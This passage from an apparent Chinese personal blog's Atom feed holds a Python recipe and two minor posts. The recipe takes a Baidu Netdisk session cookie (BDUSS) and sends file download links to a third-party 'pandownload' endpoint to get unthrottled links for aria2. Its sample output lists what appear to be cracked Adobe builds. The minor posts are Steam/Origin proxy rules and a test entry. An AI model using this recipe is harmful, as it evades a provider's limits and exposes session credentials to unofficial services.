    
    
    
    <category term="随笔" scheme="https://wxy1343.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="漏洞" scheme="https://wxy1343.xyz/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="锐捷" scheme="https://wxy1343.xyz/tags/%E9%94%90%E6%8D%B7/"/>
    
    <category term="Ruijie" scheme="https://wxy1343.xyz/tags/Ruijie/"/>
    
  </entry>
  
  <entry>
    <title>百度云盘加速链接</title>
    <link href="https://wxy1343.xyz/2022/05/27/%E7%99%BE%E5%BA%A6%E4%BA%91%E7%9B%98%E5%8A%A0%E9%80%9F%E9%93%BE%E6%8E%A5/"/>
    <id>https://wxy1343.xyz/2022/05/27/%E7%99%BE%E5%BA%A6%E4%BA%91%E7%9B%98%E5%8A%A0%E9%80%9F%E9%93%BE%E6%8E%A5/</id>
    <published>2022-05-26T18:56:25.000Z</published>
    <updated>2022-05-26T19:47:34.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h1><ul><li>BDUSS从Cookies中获取 </li><li>获取fs_id &gt; <a href="https://pan.baidu.com/api/list">https://pan.baidu.com/api/list</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get_info(bduss: str, fs_id_list: list[int]):</span><br><span class="line">    url = f&#x27;https://pan.baidu.com/rest/2.0/xpan/multimedia?method=filemetas&amp;dlink=1&amp;fsids=&#123;str(fs_id_list)&#125;&#x27;</span><br><span class="line">    headers = &#123;&#x27;User-Agent&#x27;: &#x27;netdisk&#x27;&#125;</span><br><span class="line">    cookies = &#123;&#x27;BDUSS&#x27;: bduss&#125;</span><br><span class="line">    r = requests.get(url, headers=headers, cookies=cookies)</span><br><span class="line">    return r.json()</span><br></pre></td></tr></table></figure></li><li>返回内容<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;errmsg&quot;</span>: <span class="string">&quot;succ&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;errno&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;category&quot;</span>: <span class="number">6</span>,</span><br><span class="line">            <span class="attr">&quot;dlink&quot;</span>: <span class="string">&quot;https://d.pcs.baidu.com/file/217561fe2ja3d0d20b9bd148aee48bb5?fid=260214155-250528-898880197587684&amp;rt=pr&amp;sign=FDtAERV-DCb740ccc5511e5e8fedcff06b081203-QHdtZYz7zmIMY2lEFdqMV%2FKhtFI%3D&amp;expires=8h&amp;chkbd=0&amp;chkv=2&amp;dp-logid=2980018677620132863&amp;dp-callid=0&amp;dstime=1653592206&amp;r=186363388&amp;origin_appid=&amp;file_type=0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;filename&quot;</span>: <span class="string">&quot;Adobe_After_Effects_2022_22.4.0.56_ACR14.3_SP_20220511.sha&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fs_id&quot;</span>: <span class="number">898880197587684</span>,</span><br><span class="line">            <span class="attr">&quot;isdir&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;217561fe2ja3d0d20b9bd148aee48bb5&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;oper_id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/53/2022 Win x64 SP版/Adobe_After_Effects_2022_22.4.0.56_ACR14.3_SP_20220511.sha&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;server_ctime&quot;</span>: <span class="number">1652282159</span>,</span><br><span class="line">            <span class="attr">&quot;server_mtime&quot;</span>: <span class="number">1653575035</span>,</span><br><span class="line">            <span class="attr">&quot;size&quot;</span>: <span class="number">102</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;names&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;request_id&quot;</span>: <span class="string">&quot;9153821567553977958&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取加速链接"><a href="#获取加速链接" class="headerlink" title="获取加速链接"></a>获取加速链接</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def get_accelerated_link(bduss: str, fs_id: int):</span><br><span class="line">    url = &#x27;https://dd.pandownload.net/zhuzhuxd.php&#x27;</span><br><span class="line">    headers = &#123;&#x27;User-Agent&#x27;: &#x27;netdisk&#x27;&#125;</span><br><span class="line">    result = get_info(bduss, [fs_id])[&#x27;list&#x27;][0]</span><br><span class="line">    r = requests.post(url, headers=headers, json=&#123;</span><br><span class="line">        &quot;dlink&quot;: result[&#x27;dlink&#x27;],</span><br><span class="line">        &quot;md5&quot;: result[&#x27;md5&#x27;],</span><br><span class="line">        &quot;name&quot;: result[&#x27;filename&#x27;],</span><br><span class="line">        &quot;size&quot;: result[&#x27;size&#x27;]</span><br><span class="line">    &#125;)</span><br><span class="line">    return r.json()</span><br></pre></td></tr></table></figure></li><li>返回内容<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;code&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Success&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ua&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;split&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;parallel&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">&quot;urls&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://bjbgp01.baidupcs.com/file/5f55f372aj36220d3a411870f736326e?bkt=en-c58a217c5b5bf7b28f5f877ec93aa526fe22b9452701d6e56f882c309575d9d0c90443aba1db93f3&amp;fid=2428468458-250528-366463692346595&amp;time=1653592527&amp;sign=FDTAXUbGERQlBHSKfWaqi-DCb740ccc5511e5e8fedcff06b081203-Eo8L8YuvdBZ7w4CcWPe8JeCVzf8%3D&amp;to=75&amp;size=964308002&amp;sta_dx=964308002&amp;sta_cs=331&amp;sta_ft=&amp;origin=dlna&amp;sta_ct=0&amp;sta_mt=0&amp;fm2=MH%2CYangquan%2CAnywhere%2C%2CNone%2Cany&amp;ctime=1653592526&amp;mtime=1653592526&amp;resv0=-1&amp;resv1=0&amp;resv2=rlim&amp;resv3=5&amp;resv4=964308002&amp;vuk=2428468458&amp;iv=0&amp;htype=&amp;randtype=&amp;tkbind_id=0&amp;newver=1&amp;newfm=1&amp;secfm=1&amp;flow_ver=3&amp;pkey=en-f15c91a5a6c11ecd4ddaa04788b70871c050cc9ccec4b4fb9110b3846a0207b866e8bb8c01b18aff&amp;expires=8h&amp;rt=pr&amp;r=306201854&amp;mlogid=3389300239588472221&amp;vbdid=-&amp;fin=Adobe_InDesign_2022_17.2.1.105_SP_20220501.rar&amp;fn=Adobe_InDesign_2022_17.2.1.105_SP_20220501.rar&amp;err_ver=1.0&amp;rtype=1&amp;clienttype=0&amp;dp-logid=3389300239588472221&amp;dp-callid=0.1.1&amp;hps=1&amp;tsl=0&amp;csl=0&amp;fsl=-1&amp;csign=EqS%2FPTPPWYprgm%2Baqvcrwmbxwwo%3D&amp;so=0&amp;ut=6&amp;uter=4&amp;serv=1&amp;uc=1181241563&amp;ti=3aca7a148382b421c980730aac64496b77deba54338200be&amp;hflag=30&amp;from_type=1&amp;adg=n&amp;reqlabel=250528_d_f99d00b806634c4bf79f3c76f9f38326_-1_f8b19d2c52c461145127e6c3eafaa0f1&amp;by=themis&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>添加到aria2就能不限速下载了(需要修改为返回的ua)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;获取文件信息&quot;&gt;&lt;a href=&quot;#获取文件信息&quot; class=&quot;headerlink&quot; title=&quot;获取文件信息&quot;&gt;&lt;/a&gt;获取文件信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;BDUSS从Cookies中获取 &lt;/li&gt;
&lt;li&gt;获取fs_id &amp;gt; &lt;a href=</summary>
      
    
    
    
    
    <category term="随笔" scheme="https://wxy1343.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="百度云盘" scheme="https://wxy1343.xyz/tags/%E7%99%BE%E5%BA%A6%E4%BA%91%E7%9B%98/"/>
    
  </entry>
  
  <entry>
    <title>代理规则</title>
    <link href="https://wxy1343.xyz/2022/05/15/%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/"/>
    <id>https://wxy1343.xyz/2022/05/15/%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/</id>
    <published>2022-05-15T14:44:15.000Z</published>
    <updated>2022-05-18T13:38:36.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Steam"><a href="#Steam" class="headerlink" title="Steam"></a>Steam</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>强制指定steam.exe使用tcp &gt; <code>steam.exe -tcp</code><h2 id="需要代理的进程和域名"><a href="#需要代理的进程和域名" class="headerlink" title="需要代理的进程和域名"></a>需要代理的进程和域名</h2></li><li>steam.exe<ul><li>*.steampowered.com</li><li>steamcdn-a.akamaihd.net</li><li>steam-chat.com</li><li>*.steamstatic.com</li><li>steamcommunity.com</li></ul></li><li>steamwebhelper.exe</li></ul><h1 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h1><h2 id="不代理下载域名"><a href="#不代理下载域名" class="headerlink" title="不代理下载域名"></a>不代理下载域名</h2><ul><li>origin.exe<ul><li>origin-a.akamaihd.net</li><li>river.data.ea.com</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Steam&quot;&gt;&lt;a href=&quot;#Steam&quot; class=&quot;headerlink&quot; title=&quot;Steam&quot;&gt;&lt;/a&gt;Steam&lt;/h1&gt;&lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配</summary>
      
    
    
    
    
    <category term="随笔" scheme="https://wxy1343.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://wxy1343.xyz/2022/05/15/test/"/>
    <id>https://wxy1343.xyz/2022/05/15/test/</id>
    <published>2022-05-14T17:32:16.000Z</published>
    <updated>2022-05-14T19:47:44.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>测试</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;test&quot;&gt;&lt;a href=&quot;#test&quot; class=&quot;headerlink&quot; title=&quot;test&quot;&gt;&lt;/a&gt;test&lt;/h1&gt;&lt;p&gt;测试&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="随笔" scheme="https://wxy1343.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="test" scheme="https://wxy1343.xyz/tags/test/"/>
    
  </entry>
  
</feed>
